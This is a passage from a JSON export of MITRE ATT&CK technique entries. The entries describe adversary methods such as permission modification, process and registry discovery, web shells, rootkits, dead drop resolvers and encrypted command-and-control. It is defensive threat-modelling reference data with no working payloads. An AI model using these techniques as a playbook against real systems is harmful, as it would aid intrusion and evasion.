infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).\", \"id\": \"attack-pattern--830c9528-df21-472c-8c14-a036bf17d665\"}, \"attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-10-17T00:14:20.652Z\", \"name\": \"File and Directory Permissions Modification\", \"attack_pattern_identifier\": \"T1222\", \"description\": \"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\\n\\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [.bash_profile and .bashrc](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\", \"modified\": \"2020-09-01T20:05:05.562Z\", \"id\": \"attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196\"}, \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:04.710Z\", \"name\": \"File and Directory Discovery\", \"attack_pattern_identifier\": \"T1083\", \"modified\": \"2020-09-16T16:02:16.770Z\", \"description\": \"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106).\", \"id\": \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\"}, \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-01-22T21:04:23.285Z\", \"name\": \"Event Triggered Execution\", \"attack_pattern_identifier\": \"T1546\", \"description\": \"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. \\n\\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\\n\\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. \", \"modified\": \"2020-10-21T18:48:27.576Z\", \"id\": \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\"}, \"attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:48.728Z\", \"name\": \"Process Discovery\", \"attack_pattern_identifier\": \"T1057\", \"modified\": \"2020-03-26T18:05:53.130Z\", \"description\": \"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.\", \"id\": \"attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580\"}, \"attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2019-12-13T16:46:18.927Z\", \"name\": \"Web Shell\", \"attack_pattern_identifier\": \"T1505.003\", \"modified\": \"2020-09-16T19:34:19.752Z\", \"description\": \"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\\n\\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013) \", \"id\": \"attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb\"}, \"attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-31T12:35:36.479Z\", \"name\": \"File Deletion\", \"attack_pattern_identifier\": \"T1070.004\", \"description\": \"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\\n\\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)\", \"modified\": \"2020-03-29T21:34:16.209Z\", \"id\": \"attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c\"}, \"attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-14T22:24:21.841Z\", \"name\": \"Dead Drop Resolver\", \"attack_pattern_identifier\": \"T1102.001\", \"modified\": \"2020-03-26T23:12:30.499Z\", \"description\": \"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\\n\\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\\n\\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).\", \"id\": \"attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7\"}, \"attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-16T15:48:33.882Z\", \"name\": \"Asymmetric Cryptography\", \"attack_pattern_identifier\": \"T1573.002\", \"modified\": \"2020-03-30T00:37:16.593Z\", \"description\": \"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\\n\\nFor efficiency, may protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).\", \"id\": \"attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada\"}, \"attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-16T15:45:17.032Z\", \"name\": \"Symmetric Cryptography\", \"attack_pattern_identifier\": \"T1573.001\", \"description\": \"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.\", \"modified\": \"2020-03-26T21:25:37.306Z\", \"id\": \"attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41\"}, \"attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-12T20:38:12.465Z\", \"name\": \"Hijack Execution Flow\", \"attack_pattern_identifier\": \"T1574\", \"description\": \"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\\n\\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.\", \"modified\": \"2020-10-17T15:15:28.288Z\", \"id\": \"attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6\"}, \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:25.584Z\", \"name\": \"Query Registry\", \"attack_pattern_identifier\": \"T1012\", \"description\": \"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\\n\\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\", \"modified\": \"2020-03-26T18:08:20.049Z\", \"id\": \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\"}, \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:12:31.196Z\", \"name\": \"Windows Command Shell\", \"attack_pattern_identifier\": \"T1059.003\", \"modified\": \"2020-03-28T17:02:13.722Z\", \"description\": \"Adversaries may abuse the Windows command shell for execution. The Windows command shell (<code>cmd.exe</code>) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. \\n\\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\\n\\nAdversaries may leverage <code>cmd.exe</code> to execute various commands and payloads. Common uses include <code>cmd.exe /c</code> to execute a single command, or abusing <code>cmd.exe</code> interactively with input and output forwarded over a command and control channel.\", \"id\": \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\"}, \"attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:26.496Z\", \"name\": \"Rootkit\", \"attack_pattern_identifier\": \"T1014\", \"description\": \"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \\n\\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)\", \"modified\": \"2020-06-20T22:29:55.496Z\", \"id\": \"attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b\"}}}"